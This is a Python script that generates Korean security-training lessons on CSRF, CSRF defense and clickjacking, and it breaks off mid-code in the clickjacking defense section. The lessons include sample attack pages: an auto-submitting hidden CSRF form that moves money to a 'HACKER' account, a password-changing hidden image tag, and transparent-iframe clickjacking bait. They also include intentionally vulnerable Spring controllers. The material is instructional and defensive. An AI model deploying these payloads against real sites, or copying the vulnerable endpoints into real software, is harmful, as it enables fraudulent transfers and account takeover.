#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Security Content Generator - 02_attacks Section (More Attacks)
Generates high-quality Korean security content for:
- csrf: CSRF attack principles
- csrf-prevent: CSRF defense (merged with csrf-prevention)
- clickjacking: Clickjacking attacks
- ssrf: SSRF attacks
- dos-ddos: DoS/DDoS attacks and defense
"""

import json
import os

def get_csrf_content():
    """CSRF (Cross-Site Request Forgery) attack content"""
    return {
        "id": "02_공격/csrf",
        "title": "CSRF 공격 원리 (Cross-Site Request Forgery)",
        "category": "security",
        "subCategory": "02_공격",
        "language": "Java",
        "description": "CSRF(Cross-Site Request Forgery) 공격의 원리를 이해하고, 사용자의 세션을 악용한 위조 요청 공격 방식을 학습합니다.",
        "isPlaceholder": False,
        "sections": [
            {
                "type": "concept",
                "title": "CSRF 공격 완전 정복",
                "content": "## 한 줄 요약\n> **CSRF는 로그인된 사용자의 브라우저를 이용해 사용자 모르게 악의적인 요청을 보내는 공격입니다.**\n\n## 비유로 이해하기\n\n**은행 창구 비유:**\n\n당신이 은행에 로그인(신분증 제출)한 상태라고 생각해보세요.\n\n```\n[정상적인 송금]\n당신 --> 은행 창구 --> \"내 계좌에서 친구에게 10만원 보내주세요\"\n                    --> 은행: \"신분증 확인됨, 송금 완료!\"\n\n[CSRF 공격]\n해커가 만든 가짜 서류를 당신 모르게 창구에 제출\n해커 --> (당신 이름으로) --> 은행 창구 --> \"내 계좌에서 해커에게 100만원 보내주세요\"\n                                      --> 은행: \"신분증 확인됨(?), 송금 완료!\"\n```\n\n**핵심 문제:** 은행(서버)은 \"이 요청이 정말 본인이 보낸 건가?\"를 확인하지 않음!\n\n## 실제 해킹 사고\n\n### Netflix CSRF 취약점 (2006)\n- **피해**: 사용자 계정 설정 변경, DVD 배송 주소 변조\n- **원인**: 계정 설정 변경 시 CSRF 토큰 미검증\n- **결과**: 보안 연구원에 의해 발견되어 즉시 패치\n\n### ING Direct 은행 CSRF (2008)\n- **피해**: 사용자 계좌에서 무단 송금 가능\n- **원인**: 송금 요청에 CSRF 방어 없음\n- **벌금/배상**: 금융 당국 감사 및 보안 개선 명령\n\n### YouTube CSRF (2008)\n- **피해**: 사용자 동영상 삭제, 채널 구독 변조\n- **원인**: 상태 변경 요청에 토큰 검증 누락\n- **영향**: Google의 전체 서비스 보안 정책 강화 계기"
            },
            {
                "type": "code",
                "title": "공격 원리와 취약한 코드",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// CSRF 공격 흐름도\n// ═══════════════════════════════════════════════════════════════\n//\n// [1] 사용자가 정상적으로 은행 사이트에 로그인\n//     User --> Bank.com --> 로그인 성공, 세션 쿠키 발급\n//\n// [2] 사용자가 로그인 상태에서 악성 사이트 방문\n//     User --> Evil.com (해커 사이트)\n//\n// [3] 악성 사이트의 숨겨진 폼이 자동으로 은행에 요청 전송\n//     Evil.com --> (사용자 브라우저 경유) --> Bank.com\n//     \"해커 계좌로 100만원 송금해주세요\"\n//\n// [4] 브라우저가 자동으로 은행 세션 쿠키를 포함하여 전송!\n//     Bank.com: \"세션 쿠키 유효함. 송금 처리 완료!\"\n//\n// ═══════════════════════════════════════════════════════════════\n\n// ========================================\n// 취약한 송금 API (Spring Boot 3.x)\n// ========================================\n@RestController\n@RequestMapping(\"/api/transfer\")\npublic class VulnerableTransferController {\n    \n    @Autowired\n    private AccountService accountService;\n    \n    // CSRF 취약점: 요청의 출처를 검증하지 않음\n    @PostMapping(\"/money\")\n    public ResponseEntity<String> transferMoney(\n            @RequestParam String toAccount,\n            @RequestParam BigDecimal amount,\n            HttpSession session) {\n        \n        // 세션에서 로그인된 사용자 확인 (인증은 함)\n        User user = (User) session.getAttribute(\"user\");\n        if (user == null) {\n            return ResponseEntity.status(401).body(\"로그인 필요\");\n        }\n        \n        // 문제: 이 요청이 정말 사용자가 의도한 것인지 확인 안 함!\n        // 해커 사이트에서 자동 제출된 폼도 통과됨\n        accountService.transfer(user.getAccountId(), toAccount, amount);\n        \n        return ResponseEntity.ok(\"송금 완료: \" + amount + \"원\");\n    }\n}\n\n// ========================================\n// 해커가 만든 악성 페이지 (evil.com/trap.html)\n// ========================================\n/*\n<!DOCTYPE html>\n<html>\n<head><title>축하합니다! 당첨되셨습니다!</title></head>\n<body>\n    <h1>iPhone 15 Pro 무료 증정 이벤트!</h1>\n    <p>아래 버튼을 클릭하세요!</p>\n    \n    <!-- 사용자에게 보이지 않는 숨겨진 폼 -->\n    <iframe name=\"csrf-frame\" style=\"display:none;\"></iframe>\n    \n    <form id=\"csrf-form\" \n          action=\"https://bank.com/api/transfer/money\" \n          method=\"POST\"\n          target=\"csrf-frame\">\n        <input type=\"hidden\" name=\"toAccount\" value=\"HACKER-1234567\">\n        <input type=\"hidden\" name=\"amount\" value=\"1000000\">\n    </form>\n    \n    <script>\n        // 페이지 로드 시 자동으로 폼 제출!\n        // 사용자가 bank.com에 로그인된 상태라면 송금됨\n        document.getElementById('csrf-form').submit();\n    </script>\n    \n    <button onclick=\"alert('축하합니다!')\">당첨 확인하기</button>\n</body>\n</html>\n*/\n\n// ========================================\n// 이미지 태그를 이용한 GET 요청 CSRF\n// ========================================\n/*\n<!-- 비밀번호 변경 API가 GET을 허용하면 이미지로도 공격 가능 -->\n<img src=\"https://bank.com/api/user/changePassword?newPassword=hacked123\" \n     style=\"display:none;\">\n\n<!-- 사용자가 이 페이지를 열면 비밀번호가 변경됨 -->\n*/\n\n// ========================================\n// 취약한 비밀번호 변경 API\n// ========================================\n@RestController\npublic class VulnerablePasswordController {\n    \n    // 최악의 실수: GET으로 상태 변경 허용 + CSRF 방어 없음\n    @GetMapping(\"/api/user/changePassword\")\n    public String changePassword(\n            @RequestParam String newPassword,\n            HttpSession session) {\n        \n        User user = (User) session.getAttribute(\"user\");\n        if (user == null) return \"로그인 필요\";\n        \n        // 이미지 태그 하나로 비밀번호 탈취!\n        userService.updatePassword(user.getId(), newPassword);\n        return \"비밀번호 변경됨\";\n    }\n}"
            },
            {
                "type": "code",
                "title": "CSRF 공격 탐지와 분석",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// CSRF 공격 탐지 로그 분석\n// ═══════════════════════════════════════════════════════════════\n\n// 정상 요청 로그\n// POST /api/transfer/money HTTP/1.1\n// Host: bank.com\n// Origin: https://bank.com          <-- 같은 출처\n// Referer: https://bank.com/mypage  <-- 같은 출처\n// Cookie: JSESSIONID=abc123\n// Content-Type: application/x-www-form-urlencoded\n// toAccount=FRIEND-123&amount=50000\n\n// CSRF 공격 요청 로그 (의심 패턴)\n// POST /api/transfer/money HTTP/1.1\n// Host: bank.com\n// Origin: https://evil.com          <-- 다른 출처! 의심\n// Referer: https://evil.com/trap    <-- 다른 출처! 의심\n// Cookie: JSESSIONID=abc123         <-- 세션은 유효\n// Content-Type: application/x-www-form-urlencoded\n// toAccount=HACKER-9999&amount=1000000\n\n// ═══════════════════════════════════════════════════════════════\n// CSRF 탐지 로깅 구현\n// ═══════════════════════════════════════════════════════════════\n\n@Component\npublic class CsrfDetectionFilter extends OncePerRequestFilter {\n    \n    private static final Logger log = LoggerFactory.getLogger(CsrfDetectionFilter.class);\n    \n    @Override\n    protected void doFilterInternal(\n            HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain) throws ServletException, IOException {\n        \n        // 상태 변경 메서드만 검사\n        if (isStateChangingMethod(request.getMethod())) {\n            String origin = request.getHeader(\"Origin\");\n            String referer = request.getHeader(\"Referer\");\n            String host = request.getHeader(\"Host\");\n            \n            // Origin 또는 Referer가 다른 도메인이면 경고\n            if (isPotentialCsrf(origin, referer, host)) {\n                log.warn(\"[CSRF 의심] IP: {}, URI: {}, Origin: {}, Referer: {}, User-Agent: {}\",\n                    request.getRemoteAddr(),\n                    request.getRequestURI(),\n                    origin,\n                    referer,\n                    request.getHeader(\"User-Agent\")\n                );\n                \n                // 보안팀에 알림 전송\n                alertSecurityTeam(request);\n            }\n        }\n        \n        filterChain.doFilter(request, response);\n    }\n    \n    private boolean isStateChangingMethod(String method) {\n        return \"POST\".equals(method) || \n               \"PUT\".equals(method) || \n               \"DELETE\".equals(method) ||\n               \"PATCH\".equals(method);\n    }\n    \n    private boolean isPotentialCsrf(String origin, String referer, String host) {\n        // Origin이 있고, Host와 다르면 의심\n        if (origin != null && !origin.contains(host)) {\n            return true;\n        }\n        // Referer가 있고, Host와 다르면 의심\n        if (referer != null && !referer.contains(host)) {\n            return true;\n        }\n        return false;\n    }\n    \n    private void alertSecurityTeam(HttpServletRequest request) {\n        // Slack, 이메일 등으로 보안팀 알림\n    }\n}"
            },
            {
                "type": "tip",
                "title": "실무 체크리스트 & 면접",
                "content": "## CSRF 취약점 체크리스트\n\n### 필수 확인 사항\n- [ ] 모든 상태 변경 요청(POST, PUT, DELETE)에 CSRF 토큰 적용\n- [ ] CSRF 토큰이 세션별로 고유하게 생성되는지 확인\n- [ ] GET 요청으로 상태 변경하는 API가 없는지 확인\n- [ ] SameSite 쿠키 속성이 설정되어 있는지 확인\n- [ ] Origin/Referer 헤더 검증이 구현되어 있는지 확인\n\n### Spring Security CSRF 체크\n- [ ] csrf().disable() 호출 여부 확인 (운영에서는 절대 비활성화 금지)\n- [ ] 프론트엔드에서 CSRF 토큰을 폼/헤더에 포함하는지 확인\n- [ ] REST API의 경우 Stateless CSRF 방식 적용 여부 확인\n\n---\n\n## 면접 질문\n\n### Junior (신입/주니어)\n\n**Q: CSRF가 무엇인가요?**\n> A: CSRF는 Cross-Site Request Forgery의 약자로, 사용자가 로그인된 상태에서 악성 사이트를 방문하면 사용자 모르게 원래 사이트에 요청이 전송되는 공격입니다. 예를 들어, 은행에 로그인한 상태에서 해커 사이트를 방문하면 송금 요청이 자동으로 실행될 수 있습니다.\n\n**Q: CSRF와 XSS의 차이점은?**\n> A: XSS는 악성 스크립트를 사이트에 주입하여 실행하는 것이고, CSRF는 사용자의 인증된 세션을 악용하여 위조된 요청을 보내는 것입니다. XSS는 Same-Origin Policy를 우회하고, CSRF는 브라우저의 자동 쿠키 전송을 악용합니다.\n\n### Senior (경력)\n\n**Q: SPA(Single Page Application)에서 CSRF를 어떻게 방어하나요?**\n> A: 1) Double Submit Cookie 패턴 사용 - 쿠키와 헤더에 동일 토큰 전송\n> 2) Custom Header 방식 - X-CSRF-Token 같은 커스텀 헤더 사용\n> 3) SameSite=Strict 쿠키 설정\n> 4) JWT를 localStorage에 저장하고 Authorization 헤더로 전송 (쿠키 미사용)\n\n**Q: CSRF 토큰은 어디에 저장해야 하나요? 세션? 쿠키?**\n> A: 서버 세션에 저장하는 것이 가장 안전합니다. 쿠키에 저장할 경우 Double Submit Cookie 패턴을 사용해야 하며, HttpOnly 속성 없이 JavaScript에서 읽을 수 있어야 합니다. 이때 SameSite 속성을 반드시 설정해야 합니다.\n\n---\n\n## 학습 리소스\n\n- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\n- **Spring Security CSRF 공식 문서**: https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html\n- **PortSwigger CSRF Labs**: https://portswigger.net/web-security/csrf"
            }
        ]
    }

def get_csrf_prevent_content():
    """CSRF defense content (merged with csrf-prevention)"""
    return {
        "id": "02_공격/csrf-prevent",
        "title": "CSRF 방어 기법",
        "category": "security",
        "subCategory": "02_공격",
        "language": "Java",
        "description": "CSRF 공격을 방어하기 위한 다양한 기법들과 Spring Security를 활용한 실전 구현 방법을 학습합니다.",
        "isPlaceholder": False,
        "sections": [
            {
                "type": "concept",
                "title": "CSRF 방어 완전 정복",
                "content": "## 한 줄 요약\n> **CSRF 방어의 핵심은 \"이 요청이 정말 우리 사이트에서 온 것인가?\"를 검증하는 것입니다.**\n\n## 비유로 이해하기\n\n**비밀 암호 시스템:**\n\n은행과 당신 사이에 비밀 암호(CSRF 토큰)를 정합니다.\n\n```\n[방어 전략: 비밀 암호]\n\n1. 은행이 당신에게만 비밀 암호 발급: \"오늘의 암호는 X7K9P\"\n2. 송금할 때 이 암호를 함께 제출해야 함\n3. 해커는 이 암호를 모름!\n\n[정상 요청]\n당신 --> 은행: \"송금해주세요\" + 암호: X7K9P\n은행 --> \"암호 일치! 송금 처리\"\n\n[CSRF 공격 시도]\n해커 사이트 --> 은행: \"송금해주세요\" + 암호: ???\n은행 --> \"암호 없음! 요청 거부!\"\n```\n\n## 실제 방어 성공 사례\n\n### Google의 CSRF 방어 (2009~)\n- **방법**: Double Submit Cookie + Origin 검증\n- **효과**: Gmail, YouTube 등 모든 서비스에서 CSRF 차단\n- **특징**: SameSite 쿠키 정책 선도적 도입\n\n### Facebook의 다층 방어 (2010~)\n- **방법**: fb_dtsg 토큰 + 추가 검증 레이어\n- **효과**: 수십억 사용자의 계정 보호\n- **특징**: 모바일/웹 통합 토큰 관리\n\n### GitHub의 CSRF 방어\n- **방법**: authenticity_token + Strict SameSite\n- **효과**: 레포지토리 설정 변경 등 민감 작업 보호\n- **특징**: API 토큰과 CSRF 토큰 분리 관리"
            },
            {
                "type": "code",
                "title": "방어 코드와 실전",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// Spring Boot 3.x CSRF 방어 설정\n// ═══════════════════════════════════════════════════════════════\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // CSRF 보호 활성화 (기본값이지만 명시적으로)\n            .csrf(csrf -> csrf\n                // 쿠키 기반 CSRF 토큰 (SPA 친화적)\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n                // 토큰 핸들러 설정\n                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())\n                // 특정 경로 제외 (웹훅 등)\n                .ignoringRequestMatchers(\"/api/webhook/**\", \"/api/public/**\")\n            )\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/\", \"/login\", \"/register\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .formLogin(form -> form\n                .loginPage(\"/login\")\n                .defaultSuccessUrl(\"/dashboard\")\n            );\n        \n        return http.build();\n    }\n}\n\n// ═══════════════════════════════════════════════════════════════\n// Thymeleaf 폼에서 CSRF 토큰 자동 포함\n// ═══════════════════════════════════════════════════════════════\n/*\n<!-- templates/transfer.html -->\n<form th:action=\"@{/api/transfer/money}\" method=\"post\">\n    <!-- Thymeleaf가 자동으로 CSRF 토큰 삽입 -->\n    <!-- <input type=\"hidden\" name=\"_csrf\" value=\"...token...\"> -->\n    \n    <input type=\"text\" name=\"toAccount\" placeholder=\"받는 계좌\">\n    <input type=\"number\" name=\"amount\" placeholder=\"금액\">\n    <button type=\"submit\">송금</button>\n</form>\n*/\n\n// ═══════════════════════════════════════════════════════════════\n// REST API (SPA)용 CSRF 설정\n// ═══════════════════════════════════════════════════════════════\n\n@Configuration\n@EnableWebSecurity\npublic class SpaSecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf(csrf -> csrf\n                // 쿠키에 CSRF 토큰 저장 (JavaScript에서 읽을 수 있도록)\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n                // SPA용 핸들러\n                .csrfTokenRequestHandler(new SpaCsrfTokenRequestHandler())\n            )\n            // CSRF 토큰을 응답에 포함\n            .addFilterAfter(new CsrfCookieFilter(), BasicAuthenticationFilter.class);\n        \n        return http.build();\n    }\n}\n\n// SPA용 CSRF 토큰 핸들러\npublic class SpaCsrfTokenRequestHandler extends CsrfTokenRequestAttributeHandler {\n    \n    private final CsrfTokenRequestHandler delegate = new XorCsrfTokenRequestAttributeHandler();\n    \n    @Override\n    public void handle(HttpServletRequest request, HttpServletResponse response,\n                       Supplier<CsrfToken> csrfToken) {\n        this.delegate.handle(request, response, csrfToken);\n    }\n    \n    @Override\n    public String resolveCsrfTokenValue(HttpServletRequest request, CsrfToken csrfToken) {\n        // 헤더에서 토큰 확인 (X-XSRF-TOKEN)\n        String headerValue = request.getHeader(csrfToken.getHeaderName());\n        if (StringUtils.hasText(headerValue)) {\n            return super.resolveCsrfTokenValue(request, csrfToken);\n        }\n        // 폼 데이터에서 토큰 확인\n        return this.delegate.resolveCsrfTokenValue(request, csrfToken);\n    }\n}\n\n// CSRF 토큰을 쿠키로 전송하는 필터\npublic class CsrfCookieFilter extends OncePerRequestFilter {\n    \n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                    HttpServletResponse response,\n                                    FilterChain filterChain)\n            throws ServletException, IOException {\n        \n        CsrfToken csrfToken = (CsrfToken) request.getAttribute(\"_csrf\");\n        // 토큰을 강제로 로드하여 쿠키에 포함\n        csrfToken.getToken();\n        \n        filterChain.doFilter(request, response);\n    }\n}"
            },
            {
                "type": "code",
                "title": "프론트엔드 CSRF 토큰 처리",
                "language": "javascript",
                "code": "// ═══════════════════════════════════════════════════════════════\n// JavaScript (Axios)에서 CSRF 토큰 자동 처리\n// ═══════════════════════════════════════════════════════════════\n\n// axios 인스턴스 설정\nimport axios from 'axios';\n\nconst api = axios.create({\n    baseURL: '/api',\n    withCredentials: true  // 쿠키 포함 필수!\n});\n\n// 요청 인터셉터: CSRF 토큰을 헤더에 자동 추가\napi.interceptors.request.use((config) => {\n    // 쿠키에서 XSRF-TOKEN 읽기\n    const token = getCookie('XSRF-TOKEN');\n    if (token) {\n        config.headers['X-XSRF-TOKEN'] = token;\n    }\n    return config;\n});\n\nfunction getCookie(name) {\n    const value = `; ${document.cookie}`;\n    const parts = value.split(`; ${name}=`);\n    if (parts.length === 2) {\n        return parts.pop().split(';').shift();\n    }\n    return null;\n}\n\n// 사용 예시\nasync function transferMoney(toAccount, amount) {\n    try {\n        const response = await api.post('/transfer/money', {\n            toAccount,\n            amount\n        });\n        console.log('송금 성공:', response.data);\n    } catch (error) {\n        if (error.response?.status === 403) {\n            console.error('CSRF 토큰 오류 - 페이지 새로고침 필요');\n        }\n    }\n}\n\n// ═══════════════════════════════════════════════════════════════\n// React에서 CSRF 토큰 처리\n// ═══════════════════════════════════════════════════════════════\n\n// hooks/useCsrf.js\nimport { useEffect, useState } from 'react';\n\nexport function useCsrf() {\n    const [csrfToken, setCsrfToken] = useState(null);\n    \n    useEffect(() => {\n        // 쿠키에서 CSRF 토큰 읽기\n        const token = document.cookie\n            .split('; ')\n            .find(row => row.startsWith('XSRF-TOKEN='))\n            ?.split('=')[1];\n        \n        if (token) {\n            setCsrfToken(decodeURIComponent(token));\n        }\n    }, []);\n    \n    return csrfToken;\n}\n\n// components/TransferForm.jsx\nimport { useCsrf } from '../hooks/useCsrf';\n\nfunction TransferForm() {\n    const csrfToken = useCsrf();\n    \n    const handleSubmit = async (e) => {\n        e.preventDefault();\n        \n        const response = await fetch('/api/transfer/money', {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json',\n                'X-XSRF-TOKEN': csrfToken  // CSRF 토큰 포함\n            },\n            credentials: 'include',  // 쿠키 포함\n            body: JSON.stringify({\n                toAccount: e.target.toAccount.value,\n                amount: e.target.amount.value\n            })\n        });\n        \n        if (response.ok) {\n            alert('송금 완료!');\n        }\n    };\n    \n    return (\n        <form onSubmit={handleSubmit}>\n            <input name=\"toAccount\" placeholder=\"받는 계좌\" />\n            <input name=\"amount\" type=\"number\" placeholder=\"금액\" />\n            <button type=\"submit\">송금</button>\n        </form>\n    );\n}"
            },
            {
                "type": "tip",
                "title": "실무 체크리스트 & 면접",
                "content": "## CSRF 방어 구현 체크리스트\n\n### Spring Security 설정\n- [ ] csrf().disable() 제거 (운영 환경)\n- [ ] CookieCsrfTokenRepository 설정 (SPA의 경우)\n- [ ] withHttpOnlyFalse() 설정 (JS에서 토큰 읽기 필요시)\n- [ ] 웹훅 등 예외 경로만 ignoringRequestMatchers로 제외\n\n### 프론트엔드 설정\n- [ ] Axios/Fetch에서 credentials: 'include' 설정\n- [ ] 요청 시 X-XSRF-TOKEN 헤더 포함\n- [ ] 쿠키에서 XSRF-TOKEN 정상 수신 확인\n- [ ] 403 에러 시 토큰 재발급 로직 구현\n\n### 추가 방어 레이어\n- [ ] SameSite=Strict 또는 Lax 쿠키 설정\n- [ ] Origin/Referer 헤더 추가 검증\n- [ ] 중요 작업에 재인증 요구 (비밀번호 재입력)\n\n---\n\n## 면접 질문\n\n### Junior (신입/주니어)\n\n**Q: CSRF 토큰은 어떻게 동작하나요?**\n> A: 서버가 사용자에게 고유한 토큰을 발급하고, 사용자가 요청 시 이 토큰을 함께 보내야 합니다. 해커 사이트에서는 이 토큰을 알 수 없으므로 위조 요청을 보낼 수 없습니다.\n\n**Q: SameSite 쿠키 속성이 CSRF 방어에 어떻게 도움이 되나요?**\n> A: SameSite=Strict로 설정하면 다른 사이트에서 온 요청에는 쿠키가 전송되지 않습니다. 해커 사이트에서 요청을 보내도 세션 쿠키가 포함되지 않아 인증이 실패합니다.\n\n### Senior (경력)\n\n**Q: Stateless 애플리케이션에서 CSRF를 어떻게 방어하나요?**\n> A: 1) Double Submit Cookie 패턴 사용\n> 2) JWT를 HttpOnly 쿠키가 아닌 localStorage에 저장하고 Authorization 헤더로 전송\n> 3) Custom Header 강제 (브라우저는 cross-origin 요청에 custom header 추가 불가)\n> 4) Origin/Referer 검증 강화\n\n**Q: CSRF 토큰 갱신 전략은 어떻게 설계하나요?**\n> A: 1) Per-Request 토큰: 매 요청마다 새 토큰 발급 (가장 안전, 성능 비용)\n> 2) Per-Session 토큰: 세션당 하나의 토큰 (일반적)\n> 3) Sliding Window: 일정 시간마다 자동 갱신\n> 4) 주요 작업(결제, 비밀번호 변경) 후 강제 갱신\n\n---\n\n## 학습 리소스\n\n- **Spring Security Reference - CSRF**: https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html\n- **MDN SameSite Cookies**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite\n- **OWASP CSRF Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
            }
        ]
    }

def get_clickjacking_content():
    """Clickjacking attack content"""
    return {
        "id": "02_공격/clickjacking",
        "title": "클릭재킹 공격 (Clickjacking)",
        "category": "security",
        "subCategory": "02_공격",
        "language": "Java",
        "description": "클릭재킹(UI Redressing) 공격의 원리와 X-Frame-Options, CSP frame-ancestors를 활용한 방어 기법을 학습합니다.",
        "isPlaceholder": False,
        "sections": [
            {
                "type": "concept",
                "title": "클릭재킹 공격 완전 정복",
                "content": "## 한 줄 요약\n> **클릭재킹은 투명한 iframe으로 합법적인 웹사이트를 덮어씌워 사용자가 의도치 않은 클릭을 하게 만드는 공격입니다.**\n\n## 비유로 이해하기\n\n**투명 유리판 위의 가짜 버튼:**\n\n당신이 \"무료 쿠폰 받기\" 버튼을 클릭한다고 생각해보세요.\n\n```\n[사용자에게 보이는 화면]\n┌────────────────────────────────┐\n│                                │\n│    무료 아이폰 쿠폰 받기!        │\n│                                │\n│   ┌──────────────────┐         │\n│   │   쿠폰 받기      │ <-- 클릭!│\n│   └──────────────────┘         │\n│                                │\n└────────────────────────────────┘\n\n[실제 구조 - 투명한 레이어가 위에 있음]\n┌────────────────────────────────┐ <-- 보이지 않는 iframe (opacity: 0)\n│   ┌──────────────────┐         │     (은행 사이트 송금 페이지)\n│   │   송금 확인      │ <-- 실제 클릭되는 버튼!\n│   └──────────────────┘         │\n└────────────────────────────────┘\n```\n\n**결과:** \"쿠폰 받기\"를 클릭했지만, 실제로는 \"송금 확인\"을 클릭한 것!\n\n## 실제 해킹 사고\n\n### Facebook \"좋아요\" 클릭재킹 (2010)\n- **피해**: 수백만 사용자가 모르게 특정 페이지 \"좋아요\" 클릭\n- **원인**: iframe 내 좋아요 버튼 위치 조작\n- **결과**: Facebook이 X-Frame-Options 헤더 도입\n\n### Twitter 팔로우 클릭재킹 (2009)\n- **피해**: 사용자들이 원치 않는 계정 팔로우\n- **원인**: 투명 iframe으로 팔로우 버튼 노출\n- **결과**: \"Don't Click\" 웜 확산, 보안 정책 강화\n\n### Adobe Flash Player 설정 변경 (2008)\n- **피해**: 사용자 몰래 웹캠/마이크 권한 허용\n- **원인**: Flash 설정 페이지 클릭재킹\n- **벌금/배상**: Adobe 긴급 패치 배포, Flash 보안 모델 전면 개편"
            },
            {
                "type": "code",
                "title": "공격 원리와 취약한 코드",
                "language": "html",
                "code": "<!-- ═══════════════════════════════════════════════════════════════ -->\n<!-- 클릭재킹 공격 페이지 (해커가 만든 페이지) -->\n<!-- ═══════════════════════════════════════════════════════════════ -->\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>무료 아이폰 16 증정 이벤트!</title>\n    <style>\n        /* 미끼 콘텐츠 스타일 */\n        .bait-container {\n            position: relative;\n            width: 500px;\n            height: 300px;\n            margin: 100px auto;\n        }\n        \n        .bait-content {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n            border-radius: 20px;\n            display: flex;\n            flex-direction: column;\n            align-items: center;\n            justify-content: center;\n            color: white;\n        }\n        \n        .fake-button {\n            background: #ff6b6b;\n            color: white;\n            padding: 20px 40px;\n            border: none;\n            border-radius: 10px;\n            font-size: 24px;\n            cursor: pointer;\n            margin-top: 20px;\n        }\n        \n        /* 핵심: 투명한 iframe이 위에 위치 */\n        .attack-frame {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 500px;\n            height: 300px;\n            opacity: 0;          /* 완전 투명! */\n            z-index: 100;        /* 위에 배치 */\n            border: none;\n            /* 공격 대상 버튼이 우리 가짜 버튼과 겹치도록 위치 조정 */\n            /* top: -200px; left: -100px; 등으로 조정 */\n        }\n        \n        /* 디버깅용: 공격 확인 시 투명도 조절 */\n        .attack-frame.visible {\n            opacity: 0.3;  /* 반투명으로 보기 */\n        }\n    </style>\n</head>\n<body>\n    <div class=\"bait-container\">\n        <!-- 사용자에게 보이는 가짜 콘텐츠 -->\n        <div class=\"bait-content\">\n            <h1>축하합니다!</h1>\n            <p>아이폰 16 Pro Max 당첨!</p>\n            <button class=\"fake-button\">상품 받기</button>\n        </div>\n        \n        <!-- 투명한 iframe: 실제 은행 송금 페이지 -->\n        <iframe \n            class=\"attack-frame\"\n            src=\"https://bank.com/transfer?to=HACKER&amount=1000000\"\n        ></iframe>\n    </div>\n    \n    <script>\n        // 마우스 커서가 버튼 위에 있을 때만 iframe 활성화\n        document.querySelector('.bait-container').addEventListener('mouseenter', () => {\n            document.querySelector('.attack-frame').style.pointerEvents = 'auto';\n        });\n    </script>\n</body>\n</html>\n\n<!-- ═══════════════════════════════════════════════════════════════ -->\n<!-- 더 교묘한 공격: 드래그 앤 드롭 클릭재킹 -->\n<!-- ═══════════════════════════════════════════════════════════════ -->\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>재미있는 퍼즐 게임</title>\n</head>\n<body>\n    <h1>퍼즐 조각을 맞춰보세요!</h1>\n    \n    <!-- 드래그 가능한 퍼즐 조각 -->\n    <div id=\"puzzle\" draggable=\"true\" style=\"width:100px; height:100px; background:red;\">\n        퍼즐 조각\n    </div>\n    \n    <!-- 드롭 영역 (실제로는 투명한 textarea) -->\n    <div style=\"position:relative; width:300px; height:200px; border:2px dashed gray;\">\n        <p>여기에 조각을 놓으세요</p>\n        \n        <!-- 투명한 textarea: 드래그한 민감 정보가 여기로 드롭됨 -->\n        <iframe \n            src=\"https://target.com/profile\"\n            style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;\"\n        ></iframe>\n    </div>\n</body>\n</html>"
            },
            {
                "type": "code",
                "title": "방어 코드와 실전",
                "language": "java",
                "code": "// ═══════════════════════════════════════════════════════════════\n// Spring Boot 3.x 클릭재킹 방어 설정\n// ═══════════════════════════════════════════════════════════════\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // 클릭재킹 방어: X-Frame-Options 헤더 설정\n            .headers(headers -> headers\n                // 방법 1: DENY - 어떤 사이트에서도 iframe 불가\n                .frameOptions(frame -> frame.deny())\n                \n                // 방법 2: SAMEORIGIN - 같은 출처에서만 iframe 허용\n                // .frameOptions(frame -> frame.sameOrigin())\n                \n                // Content-Security-Policy frame-ancestors 설정\n                .contentSecurityPolicy(csp -> csp\n                    .policyDirectives(\"frame-ancestors 'self'\")\n                )\n            )\n            .authorizeHttpRequests(auth -> auth\n                .anyRequest().authenticated()\n            );\n        \n        return http.build();\n    }\n}\n\n// ═══════════════════════════════════════════════════════════════\n// 특정 페이지만 iframe 허용하는 커스텀 설정\n// ═══════════════════════════════════════════════════════════════\n\n@Configuration\n@EnableWebSecurity\npublic class AdvancedFrameOptionsConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .headers(headers -> headers\n                // 기본적으로 DENY\n                .frameOptions(frame -> frame.deny())\n            )\n            .authorizeHttpRequests(auth -> auth\n                .anyRequest().authenticated()\n            );\n        \n        return http.build();\n    }\n}\n\n// 특정 경로에서는 iframe 허용이 필요한 경우 (위젯 등)\n@RestController\npublic class EmbedController {\n    \n    @GetMapping(\"/embed/widget\")\n    public ResponseEntity<String> getWidget() {\n        String widget = \"<div>임베드 위젯 콘텐츠</div>\";\n        \n        return ResponseEntity.ok()\n            // 특정 도메인에서만 iframe 허용\n            .header(\"Content-Security-Policy\", \n                \"frame-ancestors https://trusted-partner.com https://another-trusted.com\")\n            // X-Frame-Options는 CSP frame-ancestors보다 우선순위 낮음\n            